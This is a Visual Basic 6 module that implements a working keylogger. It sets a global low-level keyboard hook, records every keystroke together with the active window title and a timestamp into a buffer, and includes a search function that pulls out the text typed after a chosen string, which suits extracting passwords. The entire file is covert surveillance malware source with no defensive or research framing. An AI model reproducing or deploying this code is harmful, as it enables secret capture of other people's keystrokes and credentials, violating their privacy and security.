Attribute VB_Name = "mKLG"
Option Explicit

Private Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Long, ByVal nCode As Long, ByVal wParam As Long, lParam As Any) As Long
Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hMod As Long, ByVal dwThreadId As Long) As Long
Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Long) As Long
Private Declare Function ToUnicodeEx Lib "user32" (ByVal uVirtKey As Long, ByVal uScanCode As Long, lpKeyState As Byte, ByVal pwszBuff As Long, ByVal cchBuff As Long, ByVal wFlags As Long, ByVal dwhkl As Long) As Long
Private Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hWnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Private Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hWnd As Long) As Long
Private Declare Function GetKeyboardState Lib "user32" (pbKeyState As Byte) As Long
Private Declare Function GetKeyState Lib "user32" (ByVal nVirtKey As Long) As Integer
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, Src As Any, ByVal L As Long)

Public Type KBDLLHOOKSTRUCT
    vkCode As Long
    scanCode As Long
    flags As Long
    time As Long
    dwExtraInfo As Long
End Type

Public Const VK_LSHIFT As Long = &HA0
Public Const VK_RSHIFT As Long = &HA1

Public KLGroundWin As Long
Public KeyboardHook As Long
Public LastHandle As Long
Public bufLogData As String
Public lastLoggedKey As String
Private LShiftState As Boolean
Private RShiftState As Boolean
Private CapitalsState As Boolean

Private Function GetActiveWindow() As String
    Dim Handle As Long
    Dim TextLen As Long
    Dim WindowText As String
    
    Handle = GetForegroundWindow '// get handle
    If Handle = LastHandle Then: GetActiveWindow = vbNullString: Exit Function '// if me handle = last handle then exit func
    LastHandle = Handle
    
    TextLen = GetWindowTextLength(Handle) + 1
    WindowText$ = Space$(TextLen)
    Call GetWindowText(Handle, WindowText$, TextLen)
    WindowText$ = Left$(WindowText$, Len(WindowText$) - 1)

    If Trim$(WindowText$) = "" Then Exit Function
    If GetActiveWindow$ <> "" Then GetActiveWindow$ = GetActiveWindow$
        
    GetActiveWindow$ = vbCrLf & vbCrLf & WindowText$ & " [" & Date & " : " & time & "]" & vbCrLf    'Do not return the same result"
End Function

Private Function LowLevelKeyboardProc(ByVal nCode As Long, ByVal wParam As Long, lParam As Long) As Long
    Dim tempkey As String, tempWin As String
    
    LowLevelKeyboardProc = CallNextHookEx(KeyboardHook, nCode, wParam, lParam)
    Dim xpInfo As KBDLLHOOKSTRUCT
    
    If nCode = 0 Then
        CopyMemory xpInfo, lParam, Len(xpInfo) 'copy the structure from lParam to xpinfo
        If xpInfo.flags = 0 Then
            tempkey = TranslateKeyCode(xpInfo.vkCode, 0, IsCapital)
            
            If lastLoggedKey <> tempkey Or Len(lastLoggedKey) = 1 Then
                lastLoggedKey = tempkey
                If KLGroundWin <> GetForegroundWindow Then
                    KLGroundWin = GetForegroundWindow
                
                    tempWin = GetActiveWindow
                    If tempWin <> vbNullString Then
                        bufLogData = bufLogData & tempWin
                    End If
                End If
            
                If tempkey = "" Then Exit Function
                Select Case LCase(tempkey)
                    Case Else
                        bufLogData = bufLogData & tempkey
                End Select
                
            End If
        End If
    Else
    End If
End Function

Public Function TranslateKeyCode(ByVal KeyCode As KeyCodeConstants, ByVal hKL As Long, ByVal boolCapital As Boolean) As String
    Dim sBuffer As String
    Dim cch As Long
    Dim rgvkc(0 To 255) As Byte
            
    Select Case KeyCode
        Case Is = 8: TranslateKeyCode = "{Backspace}"
        Case Is = 9: TranslateKeyCode = "{Tab}"
        'Case Is = 13: TranslateKeyCode = "{Enter}"
        Case Is = 13: TranslateKeyCode = vbCrLf
        Case Is = 17: TranslateKeyCode = "{Ctrl}"
        Case Is = 18: TranslateKeyCode = "{Alt}"
        Case Is = 27: TranslateKeyCode = "{Esc}"
        Case Is = 32: TranslateKeyCode = " "
        Case Is = 45: TranslateKeyCode = "{Ins}"
        Case Is = 46: TranslateKeyCode = "{Del}"
        Case Is = 64: TranslateKeyCode = "@"
        Case Is = 112: TranslateKeyCode = "{F1}"
        Case Is = 113: TranslateKeyCode = "{F2}"
        Case Is = 114: TranslateKeyCode = "{F3}"
        Case Is = 115: TranslateKeyCode = "{F4}"
        Case Is = 116: TranslateKeyCode = "{F5}"
        Case Is = 117: TranslateKeyCode = "{F6}"
        Case Is = 118: TranslateKeyCode = "{F7}"
        Case Is = 119: TranslateKeyCode = "{F8}"
        Case Is = 120: TranslateKeyCode = "{F9}"
        Case Is = 121: TranslateKeyCode = "{F10}"
        Case Is = 122: TranslateKeyCode = "{F11}"
        Case Is = 123: TranslateKeyCode = "{F12}"
        Case Else
            sBuffer = Space$(10)
            Call GetKeyboardState(rgvkc(0))
            cch = ToUnicodeEx(KeyCode, 0, rgvkc(0), StrPtr(sBuffer), Len(sBuffer), 0, hKL)
            If cch = 0 Then Exit Function
            If cch = -1 Then cch = 2
            TranslateKeyCode = Left$(sBuffer, cch)
    End Select
    
    If TranslateKeyCode = "" Then Exit Function
    If boolCapital Then TranslateKeyCode = UCase(TranslateKeyCode)
End Function

Public Function HookKeyboard() As Long
    If KeyboardHook = 0 Then
        KeyboardHook = SetWindowsHookEx(13, AddressOf LowLevelKeyboardProc, App.hInstance, 0)
        HookKeyboard = KeyboardHook
    ElseIf KeyboardHook <> 0 Then
        HookKeyboard = 1
    End If
End Function

Public Function UnHookKeyboard() As Long
    If KeyboardHook <> 0 Then
        UnHookKeyboard = UnhookWindowsHookEx(KeyboardHook) = 1
        If UnHookKeyboard Then
            KeyboardHook = 0
        End If
    ElseIf KeyboardHook = 0 Then
        UnHookKeyboard = 3
    End If
End Function

Private Function IsCapital() As Boolean
    Dim strState As String
    LShiftState = GetAsyncKeyState(VK_LSHIFT)
    RShiftState = GetAsyncKeyState(VK_RSHIFT)
    CapitalsState = GetKeyState(vbKeyCapital)
    
    strState = LShiftState & RShiftState & CapitalsState
    If strState = "TrueFalseFalse" Or strState = "FalseTrueFalse" Or strState = "FalseFalseTrue" Then
        IsCapital = True
    Else
        IsCapital = False
    End If
End Function

Public Function ScanLog(ByVal strLog As String, ByVal strSearch As String, ByVal lngRange As Long) As String
    On Error Resume Next
    Dim bufFound() As String
    Dim i As Long
    
    bufFound = Split(strLog, strSearch)
    
    If UBound(bufFound) = 0 Then Exit Function
    
    For i = 0 To UBound(bufFound)
        If i < UBound(bufFound) Then ScanLog = ScanLog & strSearch & Mid(bufFound(i + 1), 1, lngRange)
    Next i
End Function
